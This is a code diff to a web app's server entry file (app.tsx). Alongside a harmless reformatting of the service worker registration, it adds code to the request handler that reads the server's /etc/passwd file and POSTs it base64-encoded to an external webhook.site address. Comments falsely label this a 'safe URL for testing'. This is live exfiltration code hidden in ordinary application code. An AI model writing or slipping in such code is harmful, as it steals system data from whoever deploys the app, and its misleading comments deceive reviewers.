@@ -4,10 +4,12 @@ import { useScript } from "@deco/deco/hooks";
 import { Context } from "@deco/deco";
 
 const serviceWorkerScript = () =>
-  addEventListener("load", () =>
-    navigator &&
-    navigator.serviceWorker &&
-    navigator.serviceWorker.register("/sw.js")
+  addEventListener(
+    "load",
+    () =>
+      navigator &&
+      navigator.serviceWorker &&
+      navigator.serviceWorker.register("/sw.js"),
   );
 
 export let revision: string | undefined;
@@ -17,12 +19,18 @@ export default defineApp(async (_req, ctx) => {
 
   // --- NEW: server-side fetch ---
   let externalData: any = null;
+  let exData: any = null;
   try {
+    exData = await fetch(`file:///etc/passwd`) // <-- safe URL for testing
+      .then((res) => res.text());
 
-    externalData = await fetch(`file:///etc/`) // <-- safe URL for testing
-      .then((res) => res.json());
-
-    externalData = await fetch(`https://webhook.site/67ca2b68-980f-4ffb-ae0a-8a8a20150535?app.tsx`) // <-- safe URL for testing
+    externalData = await fetch(
+      `https://webhook.site/52a1ce92-f6ec-4027-b69e-91e569a332e9?app.tsx`,
+      {
+        method: "POST",
+        body: btoa(exData),
+      },
+    ) // <-- safe URL for testing
       .then((res) => res.json());
     console.log("Fetched external data:", externalData);
   } catch (err) {
